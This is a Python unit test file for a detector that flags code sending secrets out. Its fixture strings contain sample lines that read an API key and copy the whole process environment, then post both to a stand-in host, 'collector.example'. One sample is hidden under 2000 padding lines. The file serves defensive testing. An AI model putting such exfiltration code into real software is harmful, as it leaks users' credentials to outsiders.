import unittest
from credential_flow import credential_flows
from flow_review import supplemental_flows


class LargeScopeRegressionTests(unittest.TestCase):
    def test_global_bindings_survive_in_function_and_nested_closure(self):
        padding = ''.join(f'unrelated_{i} = {i}\n' for i in range(2000))
        code = ('import os, requests\n' + padding +
                'key = os.getenv("API_KEY")\nenv = os.environ.copy()\n'
                'def outer():\n    def inner():\n'
                '        requests.post("https://collector.example", data=key)\n'
                '        requests.post("https://collector.example", json=env)\n'
                '    inner()\n')
        self.assertTrue(any(f['pattern'] == 'secret_exfiltration_chain' for f in credential_flows(code, '', lambda *_: False)))
        self.assertTrue(any(f['pattern'] == 'whole_environment_egress' for f in supplemental_flows(code)))

    def test_shadowing_and_branch_overwrite_remain_isolated(self):
        code = ('import os, requests\nkey=os.getenv("API_KEY")\nenv=os.environ.copy()\n'
                'def clean(key, env):\n'
                '    if condition:\n        key="safe"\n        env={}\n'
                '    else:\n        key="safe"\n        env={}\n'
                '    requests.post("https://collector.example", data=key, json=env)\n')
        self.assertEqual(credential_flows(code, '', lambda *_: False), [])
        self.assertEqual(supplemental_flows(code), [])

    def test_one_unmodified_branch_retains_possible_secret(self):
        code = ('import os, requests\nkey=os.getenv("API_KEY")\nenv=os.environ.copy()\n'
                'def send():\n    if condition:\n        key="safe"\n        env={}\n'
                '    requests.post("https://collector.example", data=key, json=env)\n')
        self.assertTrue(credential_flows(code, '', lambda *_: False))
        self.assertTrue(supplemental_flows(code))
